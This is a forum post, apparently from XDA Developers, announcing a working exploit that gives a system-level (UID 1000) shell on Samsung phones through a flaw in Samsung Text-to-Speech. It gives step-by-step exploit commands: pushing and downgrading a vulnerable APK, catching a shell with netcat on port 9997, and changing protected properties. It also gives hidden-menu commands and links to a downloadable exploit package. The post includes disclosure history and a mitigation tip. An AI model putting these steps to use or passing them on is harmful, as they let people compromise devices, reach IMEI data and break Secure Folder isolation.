> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [forum.xda-developers.com](https://forum.xda-developers.com/t/system-shell-exploit-all-samsung-mobile-devices-no-bl-unlock-required.4543071/)

> THIS IS ACTIVELY IN DEVELOPMENT - Our goal is to make it more user friendly. and easier to use, so pl......

 [![](https://forum.xda-developers.com/data/avatars/s/11993/11993791.jpg?1674152113)](/m/k0mraid3.11993791/) 

#### [K0mraid3](/m/k0mraid3.11993791/)

##### Senior Member

Jan 25, 2022

201

147

[content unavailable](/misc/location-info?location=content+unavailable)

[Samsung Galaxy Tab A series](https://forum.xda-developers.com/c/samsung-galaxy-tab-a-series.5865/)

[T-Mobile Samsung Galaxy S8+](https://forum.xda-developers.com/c/t-mobile-samsung-galaxy-s8.6368/)

[](javascript:;)

*   [Jan 18, 2023](/t/system-shell-exploit-all-samsung-mobile-devices-no-bl-unlock-required.4543071/post-88016081)

*   [#1](/t/system-shell-exploit-all-samsung-mobile-devices-no-bl-unlock-required.4543071/post-88016081)

_**THIS IS ACTIVELY IN DEVELOPMENT**_ - _Our goal is to make it more user friendly. and easier to use, so please note things will change and updates will come at any given time, and there is almost certainly bugs to be found and encountered along the way during this, so if you find issues, just let us know here or in support chat, we are VERY active, and can usually get back to you in a few mins. I Will be dynamically updating this post as things progress, keeping it up-to-date with our current progress._  
**_`--UPDATED 01/20/2023: 1:20PM CST PROJECT VERSION 4.5 -- (Fixed Port issues) --`_**  
Also confirmed working on Watch.. as mentioned, [here.](https://forum.xda-developers.com/t/system-shell-exploit-all-samsung-mobile-devices-no-bl-unlock-required.4543071/post-88031395)  
This is an **_EXPLOIT_** to get a **_System based shell (UID 1000)_** on **_ANY_** Samsung Mobile Device. No clue if or when it will be patched, but has worked on every single Samsung Device tested so far.  
THIS IS THE **EQUILIVELENT** OF DOING `su system` but this **_DOES NOT_** invoke or need "su" in any way.  
This **_DOES NOT trip Knox.  
This DOES NOT give you ROOT (UID 0)_**  
_**This DOES NOT directly unlock your bootloader, although you may be able to find a way to do so using this exploit as a tool.  
If you use this for your own works, Please give credit.**_  
Next best thing to root on devices **_without_** BootLoader Unlock Option.  
Cool things that work:  
Ability to cd to /data/fota and remove updates before they install - Access to most of /efs /efs/imei /efs/sec_efs /efs/FactoryApp - Access to most of /data /data/system /data/user/0/ANY_SYSTEM_APP - The "Insthk" bin becomes useable, - Secure Folder/Separated Apps becomes COMPLETELY compromised if you also install the POC in it (UID 150_system) - start IOTHidden Menu, DM Mode, Service Mode, Multiple Debugging and hidden menus as well as preconfig in system context- Install and use DSU on locked bootloader - Change many protected props, such as: `setprop persist.service.adb.root 1 setprop service.adb.root 1 setprop sys.hidden.otatest 1 setprop sys.hiddenmenu.enable 1 setprop persist.sys.knox.device_owner true setprop persist.sys.usb.qxdm.debug 1 setprop sys.usb.qxdm.debug 1 setprop presist.service.adb.enable 1 setprop persist.sys.usb.qxdm.debug 1 setprop service.adb.enable 1 setprop persist.rollback.is_test true setprop sys.oem_unlock_allowed 1` aswell as quite a bit more.  
[![](https://forum.xda-developers.com/data/attachments/4301/4301837-5c5047b0fa39c20d186cd764eef76d11.jpg)](https://forum.xda-developers.com/attachments/1674233415470-png.5815369/)  
**_Note* You need to be on Wifi or Hotspot to set this up._**  
_**Its fairly simple, a Typical Local Privilege escalation.**_  
**_The Easy Way_** - Note, This could trigger some AV's due to embedded ADB and adb dlls, as mentioned in [this comment](https://forum.xda-developers.com/t/system-shell-exploit-all-samsung-mobile-devices-no-bl-unlock-required.4543071/post-88023529).  
You may also find the source and prebuilts on my github, [here.](https://github.com/k0mraid3)  
Step 1 - Download "Komraids System Shell.zip", (attached is the latest version) and extract anywhere on desktop. Install K0mraids POC.apk, Open atleast one time. Reboot.  
Step 2 - Ensure USB Debugging is ON, and computer is authorized. Also make sure power saving is OFF.  
Step 3 - When device is fully rebooted and unlocked, run systemshell.exe  
Step 4 - You should now be in a shell with UID 1000. Enjoy. Be careful with what you mess with.  
**_Things to note:_** The.exe only needs to be run _once after each reboot__,_ you can use it if you prefer, or _if you are having issues_ here or want to _manually open a system shell yourself, Check out "How it works?" below._  
****You MUST downgrade SMT (Samsung TTS) on EVERY reboot****​ **_How it works? (stuff for security researchers, devs etc)_**  
  
**Step 1** - Install the included "komraids_POC.apk" to the device and _**make sure to open it and let it load at least one time**_, then push the included "samsungTTSVULN2.apk" to /data/local/tmp (`adb push samsungTTSVULN2.apk /data/local/tmp`) -> `chmod 777 /data/local/tmp/samsungTTSVULN2.apk` >>> I advice disabling all battery optimizations for Samsung TTS and Shell, otherwise, it cuts off the shell from time to time.  
**Step 2** - Make sure ADB is on, Device connected to wifi and authorized and all power saving is off (as mentioned above) **Reboot device**. **_This will load our lib on reboot since TTS loads all native libs on reboot_**.  
**Step 4** - When device reboots, run this command from ADB. `adb shell pm install -r -d -f -g --full --install-reason 3 --enable-rollback /data/local/tmp/samsungTTSVULN2.apk` ---> it will return "Success" when done.  
**Step 5** - Now, **open _two_ shells**, (_OR, See_ **_NOTE_**_* below to use App Manager_) in the first, do `nc -lp 9997` & in the second, do `am start -n com.samsung.SMT/.gui.DownloadList` -> Look back at the first shell., it should have opened into a new system (UID 1000) shell.  
****You MUST downgrade SMT (Samsung TTS) on EVERY reboot****​ _SMT has a receiver that blindly accepts stuff, so a carefully crafted apk (Our "komraids_POC_v1.5.apk") can trick it into loading our neat lib which opens a shell for us on localhost port 9997!_  
SOURCE - [on GitHub, here.](https://github.com/k0mraid3/K0mraid3s_System_Shell-Source)  
_**Use `logcat | grep -i mercury` to debug if lib is loaded or not.  
NOTE: You can use something like [AppManager, seen here,](https://github.com/MuntashirAkon/AppManager) or another App installer/manager to launch the SMT activity in step 5, _**make a shortcut to it on your home screen for easy of access**_ if you have issues, give this a go instead of using two shells, only use one for the nc -lp 9997 part and App MAnager to launch activity.**_ .  
**_You are now UID 1000. Enjoy._**  
_FAQ_  
_Why wont it connect/open the system shell?_  
Various reasons can cause this, one of the most common is "Battery Optimizations", a form of power saving that can kill our apps. Power Saving is the number one issue for problems with this exploit. Second most common is, believe it or not, turning on ADB/WIFI. So make sure you either have a full battery and all power saving features are OFF, or are plugged in via USB.  
Next, make sure to FORCE stop everything and try to nc -lp and launch smt again, i know its annoying, but its taken me many tries before.  
Clear Cache of SMT  
Uninstall PoC, Reboot, Re-install PoC, Reboot, Downgrade SMT.  
_Why does this exist?_  
Idk, it was supposed to have been **_patched back in 2019_**, obviously it **_wasn't sufficient_**.  
_How do I prevent someone from hacking me with this?_  
Simple, be _**Offensive**_, set it up and lock up the lib/port, once your using this exploit, no others can because they **_cant load_** a second lib of the same. (**_the vuln is the lang packs for samsung Text-to-speech_**) -- or, _**Disable or Remove Samsung Text-To-Speech**_.  
_How do I use this in Termux or other Terminal Emulators?_  
You will need to use the manual way, as described in **_Step 5_** of **_"How it works?"_**  
_I cant get it to work, can anyone help?_  
Yes, post here or go to our Telegram Group for support, [here (click me)](https://t.me/+RLYzOPEKy95hNGFh)  
_Can this work with LSPosed/LSpatch?_  
Yes, but it has its limitations currently. I've tested a few modules myself, some work, some don't.  
_Will this work with Magisk or Shizuku?_  
Yes, But it depends on [@topjohnwu](https://forum.xda-developers.com/m/4470081/) and [@Rikka](https://forum.xda-developers.com/m/536265/), respectfully, to give the green light to me to incorporate this and post those here or post their compatible versions here on their own. I am open to working with them and have already seen and used a working Shizuku mod using this Exploit, but **_out of respect for the Developer and legality issues, I cant share that here._**. HOWEVER, _I do believe it is a good idea to get a manager for this built quickly if we plan on developing off of this._  
_Will you share the source code?_  
Yes, It is already on my GitHub, [here.](https://github.com/k0mraid3)  
**_How do i open Hidden stuff?_**  
For now, we will need to do it manually, so try these from System shell  
**_This opens IOTHiden menu_**  
`am start -n com.sec.hiddenmenu/.IOTHiddenMenu -e 7267864872 72678647376477466`  
**_This opens CID Managers "Preconfig"_**  
`am start -n com.samsung.android.cidmanager/.modules.preconfig.PreconfigActivity -a com.samsung.android.action.SECRET_CODE -d secret_code://27262826 --ei type 2`  
**_This opens the DM Mode on/off Toggle_**  
`am start -n com.sec.hiddenmenu/.DmMode -e 7267864872 72678647376477466`  
Ill add more interesting and useful commands/things to do as time goes on. Please do drop any cool things you find here!  
_BACK STORY:_  
Its full or drama and BS. I reported this to Samsung in October 2022, but they have decided this is GOOGLES problem and forgot to tell me their decision. LONG STORY CUT SHORT, Between the time Samsung decided this was GOOGLES problem and them telling me of that decision, somehow, "another external security researcher" reported this exact thing to google in the context it was their find. IDK who, nor do I really care at this point. Its done and over with, but stuff like this is what makes some security researches ever hesitant to share their finds, even with the shady vendors/OEMS.  
**_Don't be dumb, I'm not responsible for any mistakes you make._**  
[![](https://forum.xda-developers.com/data/attachments/4299/4299965-d38cf190f7b826f742a1ccefc686baf1.jpg)](https://forum.xda-developers.com/attachments/pwned-k0mraid3-2022-10-06-175216-png.5813497/)  
Big shout out to [@wr3cckl3ss1](https://forum.xda-developers.com/m/11522679/) and alll the others for the help testing, debugging and the massive amount more done to help get this right. It was truely a team effort and nothing less then a labor of love & passion for cybersecurity and learning. I learned more during this project with you guys then I can express.  
Huge thanks to [@oakieville](https://forum.xda-developers.com/m/2719104/) for the .exe and alot of help tweaking the code of this project.  
_**This project was brought to you by VAULT-TEC Dev Ops!**_  

#### Attachments

*   [](/attachments/komraids-system-shell-v4-5-zip.5815471/)Komraids System Shell V4.5.zip 65.3 MB · Views: 905

Last edited: Jan 24, 2023

*   ![](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)
*   ![](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)
*   ![](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)

Reactions: [reepje123, hinderless, xdagee and 30 others](/posts/88016081/reactions)